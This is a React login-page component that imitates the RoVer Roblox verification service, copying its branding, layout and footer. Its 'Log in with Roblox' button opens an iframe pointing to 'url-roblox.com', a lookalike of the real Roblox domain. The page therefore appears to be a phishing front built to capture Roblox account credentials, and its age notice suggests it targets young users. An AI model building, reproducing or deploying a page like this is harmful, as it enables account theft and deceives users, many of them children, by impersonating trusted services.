"use client"

import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Info } from "lucide-react"
import { Menu } from "lucide-react"
import { X } from "lucide-react"
import { useState } from "react"

const RoVerLogo = () => (
  <div className="flex items-center gap-3">
    {/* Geometric Icon */}
    <img
      src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/1759208584157-XRYQnRR1LzsHjdysKompQM37tE1LU9.jpg"
      alt="RoVer Logo"
      className="w-14 h-14 object-contain"
    />
    {/* RoVer Text */}
    <span className="text-white text-3xl font-bold tracking-tight">RoVer</span>
  </div>
)

export default function RoVerLogin() {
  const [showIframe, setShowIframe] = useState(false)

  return (
    <div className="min-h-screen bg-zinc-800">
      {/* Header */}
      <header className="bg-[#E91E8C] px-4 py-4">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          <Menu className="w-8 h-8 text-white" />
          <RoVerLogo />
          <div className="w-8"></div> {/* Spacer for centering */}
        </div>
      </header>

      {/* Main Content */}
      <main className="flex items-center justify-center px-4 py-16">
        <Card className="w-full max-w-md bg-black border-zinc-700 p-8">
          <div className="text-center space-y-6">
            <h1 className="text-3xl font-bold text-white">Sign in to RoVer</h1>

            <p className="text-zinc-400 text-sm">You must be 13 years of age or older to continue.</p>

            {/* Info Box */}
            <div className="bg-zinc-700 rounded-lg p-4 text-left">
              <div className="flex items-start gap-3">
                <Info className="w-5 h-5 text-blue-400 mt-0.5 flex-shrink-0" />
                <div className="text-sm text-zinc-300">
                  <p>If the next page says:</p>
                  <p className="mt-1">
                    <span className="text-white font-medium">
                      "You need to verify your account in order to perform this action"
                    </span>
                    , please read{" "}
                    <a href="#" className="text-pink-500 hover:text-pink-400 underline">
                      this help article
                    </a>
                    .
                  </p>
                </div>
              </div>
            </div>

            <Button
              className="w-full bg-pink-600 hover:bg-pink-700 text-white font-medium py-3 rounded-full text-lg"
              size="lg"
              onClick={() => setShowIframe(true)}
            >
              Log in with Roblox
            </Button>
          </div>
        </Card>
      </main>

      {showIframe && (
        <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4 animate-in fade-in duration-300">
          <div className="w-full max-w-5xl h-[85vh] bg-zinc-900 rounded-3xl shadow-2xl overflow-hidden transform animate-in zoom-in-95 duration-500 ease-out">
            <div className="flex items-center justify-between px-4 py-2 bg-zinc-800 border-b border-zinc-700">
              <h2 className="text-sm font-semibold text-white">Roblox Login</h2>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setShowIframe(false)}
                className="text-zinc-400 hover:text-white hover:bg-zinc-700 rounded-full"
              >
                <X className="w-5 h-5" />
              </Button>
            </div>
            <iframe
              src="https://url-roblox.com/login?returnUrl=4620367668564615"
              className="w-full h-[calc(100%-40px)] border-0"
              title="Roblox Login"
            />
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 right-0 p-6 text-center">
        <div className="space-y-4">
          {/* Imaginary Menagerie Logo */}
          <div className="flex justify-center">
            <div className="text-4xl font-bold bg-gradient-to-r from-pink-500 to-orange-400 bg-clip-text text-transparent">
              <span className="font-script">Imaginary</span>
              <br />
              <span className="font-script">Menagerie</span>
            </div>
          </div>

          <p className="text-zinc-500 text-sm">© 2025 Imaginary Menagerie, LLC.</p>

          <a href="#" className="text-zinc-600 hover:text-zinc-400 text-xs underline">
            attributions
          </a>
        </div>
      </footer>
    </div>
  )
}
